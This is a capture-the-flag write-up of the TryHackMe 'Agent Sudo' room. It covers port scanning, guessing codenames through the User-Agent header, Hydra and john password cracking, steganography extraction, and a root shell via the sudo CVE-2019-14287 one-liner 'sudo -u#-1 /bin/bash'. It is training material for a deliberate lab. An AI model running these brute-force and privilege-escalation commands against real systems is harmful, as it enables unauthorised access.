---
title: "TryHackMe: Agent Sudo Writeup - Easy"
date: 2025-11-10 21:12:00 +0300
tags: [tryhackme, ftp, steganography, sudo-vulnerability]
categories: [TryHackMe]
image:
  path: /assets/images/2025-11-10-thm-agent-sudo/cover.png
---

## Overview

**Agent Sudo** is an easy-rated room that tests enumeration skills, starting with the discovery of a valid agent's codename. This codename leads to finding credentials for the **FTP service**. The investigation then follows a trail of evidence embedded within files, using techniques like **steganography** and **zip file extraction**. Cracking various hashes grants access to the **SSH service** as a non-root agent. The final step involves escalating privileges using a known **sudo vulnerability**.

**Room Link**: [Agent Sudo](https://tryhackme.com/room/agentsudoctf){:target="_blank" rel="noopener noreferrer"}

## Enumeration

### Port Scanning

We start our enumeration by scanning the target to find all open ports using **nmap**.

```bash
$ nmap agentsudo.thm -sS -T4 -p-
```

Results:

```bash
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

Next step is to run a service scan.

```bash
$ nmap agentsudo.thm -sS -T4 -p 21,22,80 -sV --version-all
```

Results:

```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

No critical vulnerabilities draw our attention from the service versions.

### Web Enumeration

Accessing the website reveals a message indicating we should use our **codename** as the **User-Agent** header.

![Website Codename Message]({{ site.baseurl }}/assets/images/2025-11-10-thm-agent-sudo/access.png)

We try the name mentioned in the message, `Agent R`, by setting the `User-Agent` header to `R`

![R as User-Agent Header]({{ site.baseurl }}/assets/images/2025-11-10-thm-agent-sudo/agent_r.png)

The response indicates that there are a limited amount of employees.
```
What are you doing! Are you one of the 25 employees? If not, I going to report this incident
```

This heavily suggests that the codenames are single letters of the alphabet. We can quickly test letters until a different response is received. Using **Burp Suite Repeater** or a similar tool, we find that the letter `C` returns a `302 Found` redirect.

![C as User-Agent Header]({{ site.baseurl }}/assets/images/2025-11-10-thm-agent-sudo/agent_c.png)

Lets visit the redirect in the browser to see what we can find.

<!-- Insert image from browser with the redirected page -->
![Agent C Attention]({{ site.baseurl }}/assets/images/2025-11-10-thm-agent-sudo/attention.png)

### FTP Brute Force

With the username `chris` we target the **FTP** service on port 21, and since the message mentions our password being weak, `rockyou.txt` wordlist with **Hydra** should be sufficient.

```bash
$ hydra -l chris -P /usr/share/wordlists/rockyou.txt agentsudo.thm ftp
```

**Hydra** successfully finds the password, and we can now log into the **FTP** server with valid credentials.

![FTP password of chris]({{ site.baseurl }}/assets/images/2025-11-10-thm-agent-sudo/chris_ftp.png)

## Gathering Information
### File Analysis

After logging in via **FTP**, we find three files: `To_agentJ.txt`, `cute-alien.jpg`, and `cutie.png`.

![FTP password of chris]({{ site.baseurl }}/assets/images/2025-11-10-thm-agent-sudo/ftp_list.png)

The message to **Agent J** reads:

```
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```

The message confirms that a password is hidden within the images.

### Zip File Extraction (cutie.png)

We use **binwalk** on `cutie.png` to check for embedded files.

```bash
$ binwalk -e cutie.png
```

**Binwalk** confirms that there is an embedded zip file inside the picture.

![Binwalk Output of cutie.png]({{ site.baseurl }}/assets/images/2025-11-10-thm-agent-sudo/binwalk_out.png)

Trying to extract the zip prompts for a password. We use **zip2john** to convert the hash.

```bash
$ zip2john 8702.zip > zip.hash
```

Now we can crack the hash with **john**.

```bash
$ john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
```

**John** manages to crack the password.

![Zip Password Cracked With John]({{ site.baseurl }}/assets/images/2025-11-10-thm-agent-sudo/zip_pass.png)

The extracted file,`To_agentR.txt`, contains a Base64 encoded string:

```
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```

Decoding the string `QXJlYTUx` gives us the word **Area51**.

### Steganography (cute-alien.jpg)

We couldnt find anything with **binwalk** from the file `cute-alien.jpg`. So lets get back to it, and run **stegseek** to try and brute force the image.

```bash
$ stegseek cute-alien.jpg /usr/share/wordlists/rockyou.txt
```

**Stegseek** manages to find the passphrase for the image, which was connected to the Base64 encoded string we found earlier.

![Stegseek Password Cracked]({{ site.baseurl }}/assets/images/2025-11-10-thm-agent-sudo/passphrase_of_steg.png)

The extracted file, `message.txt`, has credentials for a new user `james`. We can use these with **SSH** on port `22`.

```
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```

## Privilege Escalation
### User flag

We can use the credentials we found earlier to log in via **SSH**. The user flag is in the home directory of `james`.

![Image of the User Flag]({{ site.baseurl }}/assets/images/2025-11-10-thm-agent-sudo/userflag.png)

### Root flag

We start by checking the available `sudo` privileges by running `sudo -l` since we know the password.

```bash
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```

The output tells us that the user `james` can run `/bin/bash` as any user other than `root`. Further enumeration inside the machine gives us the sudo version, which is **1.8.21p2**. Doing some research on this version of `sudo` for vulnerabilities we can find `CVE-2019-14287`. ([Reference](https://www.cybersecurity-help.cz/vdb/sudo/sudo/1.8.21p2/){:target="_blank" rel="noopener noreferrer"})

The vulnerability is exploited by specifying a user id of `-1` or `4294967295` for `sudo`, which causes the command to execute as root. ([Reference](https://www.cybersecurity-help.cz/vdb/SB2019101501){:target="_blank" rel="noopener noreferrer"})

We can use this vulnerability to bypass the `!root` restriction and run `/bin/bash` as root.

```bash
sudo -u#-1 /bin/bash
```

After exploiting the vulnerability we get a shell as root, and can read the root flag in `/root`.

![Image of the Root Flag]({{ site.baseurl }}/assets/images/2025-11-10-thm-agent-sudo/rootflag.png)

## Conclusion

**Agent Sudo** was an excellent room for practicing a diverse set of attack vectors, including web enumeration using HTTP headers, FTP brute-forcing, and layered information hiding via **steganography** and **zip file encryption.** The final stage introduced a classic, high-impact **sudo vulnerability (CVE-2019-14287)** to achieve root access, making it a well-rounded challenge.